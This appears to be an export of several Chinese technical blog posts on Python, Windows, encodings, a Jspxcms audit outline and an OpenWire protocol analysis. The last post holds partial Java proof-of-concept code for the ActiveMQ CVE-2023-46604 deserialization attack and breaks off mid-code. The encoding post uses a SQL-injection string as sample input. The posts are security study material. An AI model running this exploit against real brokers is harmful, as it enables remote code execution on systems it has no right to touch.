class="hljs-string">&quot;value2&quot;</span>&#125;<span class="hljs-symbol">daemon:</span>守护程序，设置当主进程执行完成后，线程立即结束，值为布尔值</code></pre></div><h3 id="启动线程"><a href="#启动线程" class="headerlink" title="启动线程"></a>启动线程</h3><p>t.start()</p><h3 id="进程阻塞"><a href="#进程阻塞" class="headerlink" title="进程阻塞"></a>进程阻塞</h3><p>含义：当线程任务运行完成后才继续执行主进程的任务</p><p>t.join()</p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h3 id="定义一个线程列表"><a href="#定义一个线程列表" class="headerlink" title="定义一个线程列表"></a>定义一个线程列表</h3><p>threads &#x3D; []</p><h3 id="创建多个线程对象并启动"><a href="#创建多个线程对象并启动" class="headerlink" title="创建多个线程对象并启动"></a>创建多个线程对象并启动</h3><p>for i in range(n):</p><p>t &#x3D; threading.Thread()</p><p>t.start()</p><h3 id="进程阻塞-1"><a href="#进程阻塞-1" class="headerlink" title="进程阻塞"></a>进程阻塞</h3><p>for thread in threads:</p><p>t.join()</p><h2 id="示例-30"><a href="#示例-30" class="headerlink" title="示例"></a>示例</h2><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">def</span> <span class="hljs-title function_">sing</span>(<span class="hljs-params">n</span>):    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;m singing.&quot;</span>)    time.sleep(n)<span class="hljs-keyword">def</span> <span class="hljs-title function_">dance</span>():    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;m dancing.&quot;</span>)threads = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):    t = threading.Thread(target=sing,args=(<span class="hljs-number">3</span>,))    t.start()    threads.append(t)<span class="hljs-comment">#等待所有线程执行完成后继续后续的任务</span><span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:    thread.join()dance()--------------output-----------------I<span class="hljs-string">&#x27;m singing.</span><span class="hljs-string">I&#x27;</span>m singing.I<span class="hljs-string">&#x27;m singing.</span><span class="hljs-string">I&#x27;</span>m dancing.</code></pre></div><h1 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h1><h2 id="subprocess-run"><a href="#subprocess-run" class="headerlink" title="subprocess.run()"></a>subprocess.run()</h2><h2 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h2><h1 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h1><h1 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h1>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Python/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Python/</url>
    
    <content type="html"><![CDATA[<h1 id="离线安装第三方库"><a href="#离线安装第三方库" class="headerlink" title="离线安装第三方库"></a>离线安装第三方库</h1><p><strong>下载whl包</strong></p><p>该命令会将目标包及依赖包下载保存，但不安装</p><div class="code-wrapper"><pre><code class="hljs abnf">python -m pip download 包名<span class="hljs-operator">=</span><span class="hljs-operator">=</span>版本号</code></pre></div><p>示例：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m pip download requests==<span class="hljs-number">2</span>.<span class="hljs-number">26</span>.<span class="hljs-number">0</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240913174412166.png" alt=" ">  </p><p><strong>安装whl文件</strong></p><p>将安装包上传至需要离线安装的机器上，执行命令安装单个包，需要将所有包安装</p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> pip install --<span class="hljs-keyword">no</span>-<span class="hljs-built_in">index</span> --<span class="hljs-keyword">no</span>-deps 包文件名</code></pre></div><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/S_o_l_o_n/article/details/110492806">https://blog.csdn.net/S_o_l_o_n/article/details/110492806</a></p><p><a href="https://www.coder.work/article/7534231">https://www.coder.work/article/7534231</a></p><h1 id="生成项目依赖文件"><a href="#生成项目依赖文件" class="headerlink" title="生成项目依赖文件"></a>生成项目依赖文件</h1><p><strong>安装pipreqs库</strong></p><div class="code-wrapper"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pipreqs</code></pre></div><p><strong>生成requiremenet文件</strong></p><p>在项目根目录下执行以下命令，会在项目目录下生成requirements.txt文件</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">pipreqs <span class="hljs-string">./</span> <span class="hljs-params">--encoding=utf8</span>  <span class="hljs-params">--force</span></code></pre></div><h1 id="Python程序打包"><a href="#Python程序打包" class="headerlink" title="Python程序打包"></a>Python程序打包</h1><p>pyinstaller是一个第三方包，可将python程序的所有依赖打包为一个程序</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>Linux</strong></p><div class="code-wrapper"><pre><code class="hljs mipsasm">yum -y <span class="hljs-keyword">install </span>python3yum -y <span class="hljs-keyword">install </span>glibc <span class="hljs-keyword">binutils</span><span class="hljs-keyword"></span>pip3 <span class="hljs-keyword">install </span>wheelpip3 <span class="hljs-keyword">install </span>--upgrade pippip3 <span class="hljs-keyword">install </span>pyinstaller</code></pre></div><p><strong>Windows</strong></p><div class="code-wrapper"><pre><code class="hljs cmake">pip3 <span class="hljs-keyword">install</span> pyinstaller</code></pre></div><p><a href="https://pyinstaller.org/en/stable/installation.html">https://pyinstaller.org/en/stable/installation.html</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><div class="code-wrapper"><pre><code class="hljs vim">pyinstaller -F <span class="hljs-keyword">pyfile</span>.<span class="hljs-keyword">py</span></code></pre></div><p>将在当前目录的dist目录下生成一个二进制文件，在Windows系统上生成exe文件，在Linux系统上生成ELF文件</p><h1 id="循环导入"><a href="#循环导入" class="headerlink" title="循环导入"></a>循环导入</h1><p>当A模块需要从B模块导入函数，B模块也需要从A模块中导入函数时，此时会报错循环导入</p><p>test1.py</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> test2 import word2<span class="hljs-attribute">word1</span>=<span class="hljs-string">&quot;Hello World&quot;</span><span class="hljs-built_in">print</span>(word2)</code></pre></div><p>test2.py</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> test1 import word1<span class="hljs-attribute">word2</span>=<span class="hljs-string">&quot;Hello World&quot;</span><span class="hljs-built_in">print</span>(word1)</code></pre></div><p>此时运行test1或test2将会循环导入异常</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240913171612633.png"> </p><p><strong>注意：python在导入模块时，会自动执行目标模块中的所有语句。</strong></p><h1 id="压缩JSON数据"><a href="#压缩JSON数据" class="headerlink" title="压缩JSON数据"></a>压缩JSON数据</h1><p>将python对象转换为字符串数据</p><div class="code-wrapper"><pre><code class="hljs routeros">json.dumps(dict_data_info, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>), <span class="hljs-attribute">ensure_ascii</span>=<span class="hljs-literal">False</span>)</code></pre></div><p><strong>示例</strong></p><p>从文本文件中将字符串加载为JSON格式数据并压缩数据</p><div class="code-wrapper"><pre><code class="hljs stylus">import jsonwith <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;file/jsonlog.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:    <span class="hljs-selector-tag">line</span> = f<span class="hljs-selector-class">.readline</span>()dict_data = json<span class="hljs-selector-class">.loads</span>(line)json_data = json<span class="hljs-selector-class">.dumps</span>(dict_data, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>), ensure_ascii=False)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(json_data)</span></span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Windows/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Windows/</url>
    
    <content type="html"><![CDATA[<h1 id="解除文件-文件夹占用"><a href="#解除文件-文件夹占用" class="headerlink" title="解除文件&#x2F;文件夹占用"></a><strong>解除文件&#x2F;文件夹占用</strong></h1><div class="code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">打开任务管理器</span><span class="hljs-literal">--</span><span class="hljs-comment">性能</span><span class="hljs-literal">--</span><span class="hljs-comment">打开资源监视器</span><span class="hljs-literal">--</span><span class="hljs-comment">CPU</span><span class="hljs-literal">--</span><span class="hljs-comment">关联的句柄</span><span class="hljs-literal">--</span><span class="hljs-comment">搜索占用的文件或文件夹名称，确定文件路径无误及结束进程不影响系统后，右击结束进程</span></code></pre></div><h1 id="计算MD5值"><a href="#计算MD5值" class="headerlink" title="计算MD5值"></a>计算MD5值</h1><div class="code-wrapper"><pre><code class="hljs applescript">certutil -hashfile /path/<span class="hljs-keyword">to</span>/<span class="hljs-built_in">file</span> MD5</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见编码方式</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/%E7%BC%96%E7%A0%81/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h1><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><h1 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h1><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>UTF-8 以字节为单位对Unicode 进行编码。</p><p>编码后的数据类型：二进制</p><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p>出现原因</p><div class="code-wrapper"><pre><code class="hljs">在英语中，128个符号即可表示英语语言中所有字符</code></pre></div><p>ASCII 编码是一个 7 位编码表，它将字符映射到整数值，表示为 0-127 范围内的数值。</p><p>ASCII编码仅适用于纯英文字符，并且使用的是7位二进制数。对于非英文字符、多国语言、符号等的编码，需要使用其他字符编码方案，如UTF-8、Unicode等。</p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>为什么会出现base64编码？</p><div class="code-wrapper"><pre><code class="hljs cos">解决非<span class="hljs-keyword">ascii</span>编码无法在网络中传输的问题</code></pre></div><h3 id="base64-padding"><a href="#base64-padding" class="headerlink" title="base64 padding"></a><strong>base64 padding</strong></h3><p>base64编码一定要为4的倍数，如果不足，则需要在末尾加上<code>=</code>补齐。</p><p>在一定情况下，程序会将编码数据的等号去掉，在进行base64解码时无法正常解码，此时需要对base64编码数据进行补齐。</p><p>示例</p><p>abcd字符串base64编码后为YWJjZA&#x3D;&#x3D;，程序可能会将末尾等号去掉，无法进行base64解码</p><h3 id="编码原理"><a href="#编码原理" class="headerlink" title="编码原理"></a>编码原理</h3><div class="code-wrapper"><pre><code class="hljs cos">将字符串转为二进制数据如果编码数据为纯英文数据：将英文参照<span class="hljs-keyword">ascii</span>码表转换为对应的数字表示形式，再将数字转为二进制如果编码数据为包含非英文数据：将中文使用unicode UTF8编码得到二进制将<span class="hljs-number">3</span>个<span class="hljs-number">8</span>位的二进制码为一组转换为<span class="hljs-number">4</span>个<span class="hljs-number">6</span>位二进制码为一组（不足<span class="hljs-number">6</span>位补<span class="hljs-number">0</span>，不足<span class="hljs-number">4</span>个 最后追加补位符）对每组二进制码添加<span class="hljs-number">2</span>位高位<span class="hljs-number">0</span>将每组转换为十进制将每组的十进制转换为Base64字符表中对应的字符</code></pre></div><h1 id="Java实现编码"><a href="#Java实现编码" class="headerlink" title="Java实现编码"></a>Java实现编码</h1><h2 id="Unicode-1"><a href="#Unicode-1" class="headerlink" title="Unicode"></a>Unicode</h2><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-comment">//编码</span><span class="hljs-variable">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">A</span>&#x27;;<span class="hljs-title class_">String</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">String</span>.<span class="hljs-property">format</span>(<span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\\</span>u%04x&quot;</span>, (int) <span class="hljs-variable">ch</span>);<span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(<span class="hljs-variable">unicode</span>); <span class="hljs-comment">// 输出：\\\\u0041</span><span class="hljs-comment">//解码</span><span class="hljs-title class_">String</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\\</span>u0041&quot;</span>;<span class="hljs-variable">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> (<span class="hljs-variable">char</span>) <span class="hljs-title class_">Integer</span>.<span class="hljs-property">parseInt</span>(<span class="hljs-variable">unicode</span>.<span class="hljs-property">substring</span>(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>);<span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(<span class="hljs-variable">ch</span>); <span class="hljs-comment">// 输出：A</span></code></pre></div><h2 id="ASCII-1"><a href="#ASCII-1" class="headerlink" title="ASCII"></a>ASCII</h2><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">//编码</span><span class="hljs-built_in">char</span> ch = <span class="hljs-string">&#x27;A&#x27;</span>;<span class="hljs-built_in">int</span> asciiValue = (<span class="hljs-built_in">int</span>) ch; <span class="hljs-comment">// 强制类型转换</span>System.<span class="hljs-keyword">out</span>.println(asciiValue); <span class="hljs-comment">// 输出：65</span><span class="hljs-comment">//解码</span><span class="hljs-built_in">int</span> asciiValue = <span class="hljs-number">65</span>;<span class="hljs-built_in">char</span> ch = (<span class="hljs-built_in">char</span>) asciiValue;System.<span class="hljs-keyword">out</span>.println(ch);</code></pre></div><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><div class="code-wrapper"><pre><code class="hljs abnf">//编码String str <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-comment">;</span>byte[] strBytes <span class="hljs-operator">=</span> str.getBytes()<span class="hljs-comment">;</span>String toString <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(strBytes)<span class="hljs-comment">;</span>System.out.println(toString)<span class="hljs-comment">;</span>//解码String strBase64 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;YWRtaW4=&quot;</span><span class="hljs-comment">;</span>byte[] decode <span class="hljs-operator">=</span> Base64.getDecoder().decode(strBase64)<span class="hljs-comment">;</span>String str <span class="hljs-operator">=</span> new String(decode)<span class="hljs-comment">;</span>System.out.println(str)<span class="hljs-comment">;</span></code></pre></div><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><div class="code-wrapper"><pre><code class="hljs abnf">//编码String str <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;http://www.baidu.com/?name=admin&gt;&#x27; union select 1,2,3#&quot;</span><span class="hljs-comment">;</span>String encode <span class="hljs-operator">=</span> URLEncoder.encode(str)<span class="hljs-comment">;</span>System.out.println(encode)<span class="hljs-comment">;</span>//解码String str <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http%3A%2F%2Fwww.baidu.com%2F%3Fname%3Dadmin%27+union+select+1%2C2%2C3%23&quot;</span><span class="hljs-comment">;</span>String decode <span class="hljs-operator">=</span> URLDecoder.decode(str)<span class="hljs-comment">;</span>System.out.println(decode)<span class="hljs-comment">;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jspxcms审计</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Jspxcms%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Jspxcms%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="项目信息"><a href="#项目信息" class="headerlink" title="项目信息"></a>项目信息</h1><p>项目地址：<a href="https://gitee.com/jspxcms/Jspxcms">https://gitee.com/jspxcms/Jspxcms</a></p><p>项目版本：v9.0.0</p><p>访问：</p><p>前台：<a href="http://localhost:8080/">http://localhost:8080/</a></p><p>后台：<a href="http://localhost:8080/cmscp/index.do">http://localhost:8080/cmscp/index.do</a> 用户名：admin 密码：无</p><p>技术框架：</p><table><thead><tr><th>前端</th><th>功能</th><th>后端</th><th>功能</th></tr></thead><tbody><tr><td>jQuery</td><td>JavaScript库</td><td>SpringBoot</td><td></td></tr><tr><td>Bootstrap</td><td>响应式设计前端框架</td><td>Spring</td><td></td></tr><tr><td>AdminLTE</td><td>后台管理平台开源框架</td><td>SpringMVC</td><td></td></tr><tr><td>jQuery UI</td><td>基于jQuery的UI框架</td><td>JPA</td><td>持久化框架。属于JSR标准，JPA实现选择最常用的Hibernate。</td></tr><tr><td>jQuery Validation</td><td>基于jQuery的表单校验框架</td><td>SpringDataJPA</td><td></td></tr><tr><td>UEditor</td><td>Web富文本编辑器</td><td>QueryDSL</td><td></td></tr><tr><td><a href="http://editor.md/">Editor.md</a></td><td>基于Markdown语法的Web文本编辑器</td><td>FreeMarker</td><td>模板组件</td></tr><tr><td>ECharts</td><td>用于生成图标的组件</td><td>Shiro</td><td></td></tr><tr><td>My97DatePicker</td><td>日期组件</td><td>Lucene</td><td>全文检索组件</td></tr><tr><td>zTree</td><td>树组件</td><td>Ehcache</td><td>缓存组件。主要用在JPA二级缓存、Shiro权限缓存。</td></tr><tr><td></td><td></td><td>Quartz</td><td>定时任务组件</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="文件上传-目录穿越漏洞"><a href="#文件上传-目录穿越漏洞" class="headerlink" title="文件上传&#x2F;目录穿越漏洞"></a>文件上传&#x2F;目录穿越漏洞</h2><p>后台-文件管理-文件上传</p><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h2 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h2><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>漏洞修复措施</p><p>使用html实体转义</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OpenWire协议分析</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/OpenWire%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/OpenWire%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="OpenWire协议"><a href="#OpenWire协议" class="headerlink" title="OpenWire协议"></a>OpenWire协议</h1><h2 id="什么是OpenWire协议？"><a href="#什么是OpenWire协议？" class="headerlink" title="什么是OpenWire协议？"></a>什么是OpenWire协议？</h2><p>官网介绍：<a href="https://activemq.apache.org/openwire-version-2-specification">https://activemq.apache.org/openwire-version-2-specification</a></p><div class="code-wrapper"><pre><code class="hljs applescript">OpenWire <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> marshal objects <span class="hljs-keyword">to</span> byte arrays <span class="hljs-keyword">and</span> <span class="hljs-keyword">back</span>. We will refer <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> marshaled objects <span class="hljs-keyword">as</span> commands.</code></pre></div><p>根据描述，openwire协议用于对象与字节数组之间的转化，它把转化后的对象成为命令。</p><h2 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127102758450.png"></p><p>根据描述，可知当SizePrefixDisabled选择为false值时，编码后对象即命令的编码有size，type，command-specific-fields，size根据描述大概是整个命令的长度，type字段是命令类型的标识符，command-specific-fields字段是一些根据命令类型不同而不同的其他字段。</p><p>往下看给出了每个命令类型对应的命令标识符</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103326654.png"></p><p>继续往下看给出了命令字段（对象属性）的编码格式</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103431705.png"></p><h3 id="Throwable-Type-Encoding"><a href="#Throwable-Type-Encoding" class="headerlink" title="Throwable Type Encoding"></a>Throwable Type Encoding</h3><p>因CVE-2023-46604漏洞发送的是Throwable类型数据，这里主要分析该类型</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103821178.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127103835136.png"></p><p>根据描述可知，当not-null字段为1时，throwable数据不为空，exception-name表示异常类的名字，message表示异常的提示消息，当StackTraceEnabled值为true时，才有其他字段，经分析该字段默认为false</p><h3 id="String-Type-Encoding"><a href="#String-Type-Encoding" class="headerlink" title="String Type Encoding"></a>String Type Encoding</h3><p>由于exception-name和message字段的值类型为string类型，openwire对string类型数据也需要进行编码</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127110341012.png"></p><p>可知有三个字段not-null，size，encoded-string，not-null字段表示字段值不为空，size为string长度 ，encoded-string为编码后的内容</p><h1 id="wireshark协议解析"><a href="#wireshark协议解析" class="headerlink" title="wireshark协议解析"></a>wireshark协议解析</h1><p>使用wireshark抓取openwire协议的流量观察解析的字段</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127100853602.png"></p><p>根据wireshark的协议解析，有以下字段，点击数据包的字段名称在数据体内即可显示字段的大小</p><h3 id="协议头"><a href="#协议头" class="headerlink" title="协议头"></a>协议头</h3><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">openwire</span>.length：<span class="hljs-number">4</span>个字节<span class="hljs-attribute">openwire</span>.command：<span class="hljs-number">1</span>个字节<span class="hljs-attribute">openwire</span>.command.id：<span class="hljs-number">4</span>个字节<span class="hljs-attribute">openwire</span>.command.response_required：<span class="hljs-number">1</span>个字节<span class="hljs-attribute">openwire</span>.response.correlationid：<span class="hljs-number">4</span>个字节</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127101105566.png"></p><div class="code-wrapper"><pre><code class="hljs pgsql">openwire.exceptionresponse.<span class="hljs-keyword">exception</span>：可变长<span class="hljs-keyword">not</span>-<span class="hljs-keyword">null</span>字段，<span class="hljs-number">1</span>个字节，表示openwire.exceptionresponse.<span class="hljs-keyword">exception</span>是否为空<span class="hljs-keyword">not</span>-<span class="hljs-keyword">null</span>字段，<span class="hljs-number">1</span>个字节，表示<span class="hljs-keyword">exception</span>-<span class="hljs-type">name</span>字段是否为空size字段，<span class="hljs-number">2</span>个字节，表示<span class="hljs-keyword">exception</span>-<span class="hljs-type">name</span>字段值的长度encoded-string，可变长，表示<span class="hljs-keyword">exception</span>-<span class="hljs-type">name</span>字段的值<span class="hljs-keyword">not</span>-<span class="hljs-keyword">null</span>字段，<span class="hljs-number">1</span>个字节，表示message字段是否为空size字段，<span class="hljs-number">2</span>个字节，表示message字段值的长度encoded-string，可变长，表示message字段的值</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231127111810305.png"></p><h1 id="协议构造"><a href="#协议构造" class="headerlink" title="协议构造"></a>协议构造</h1><p>结合官网协议描述和wireshark协议解析，可得出以下构造代码</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cve;<span class="hljs-keyword">import</span> javax.jms.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.OutputStream;<span class="hljs-keyword">import</span> java.net.Socket;<span class="hljs-comment">/**</span><span class="hljs-comment"> * payload构造思路，构造标准的openwire协议</span><span class="hljs-comment"> * 官方协议地址：&lt;https://activemq.apache.org/openwire-version-2-specification&gt;</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CVE_2023_46604_2</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] byteMerger(<span class="hljs-type">byte</span>[] bt1, <span class="hljs-type">byte</span>[] bt2)&#123;        <span class="hljs-type">byte</span>[] bt3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bt1.length + bt2.length];        System.arraycopy(bt1, <span class="hljs-number">0</span>, bt3, <span class="hljs-number">0</span>, bt1.length);        System.arraycopy(bt2, <span class="hljs-number">0</span>, bt3, bt1.length, bt2.length);        <span class="hljs-keyword">return</span> bt3;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123;        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bytes.length; i++) &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> Integer.toHexString(bytes[i] &amp; <span class="hljs-number">0xFF</span>);            <span class="hljs-keyword">if</span>(hex.length() &lt; <span class="hljs-number">2</span>)&#123;                sb.append(<span class="hljs-number">0</span>);            &#125;            sb.append(hex);        &#125;        <span class="hljs-keyword">return</span> sb.toString();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JMSException, IOException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;10.58.120.201&quot;</span>;        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">61616</span>;        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port);        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[] &#123;<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>&#125;;        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;http://127.0.0.1/calc.xml&gt;&quot;</span>;        <span class="hljs-type">byte</span>[] ClassNameBytes = className.getBytes();        <span class="hljs-type">byte</span>[] messageBytes = message.getBytes();        <span class="hljs-type">byte</span>[] notnull = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x01</span>&#125;;        <span class="hljs-type">byte</span>[] classLength = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x00</span>,(<span 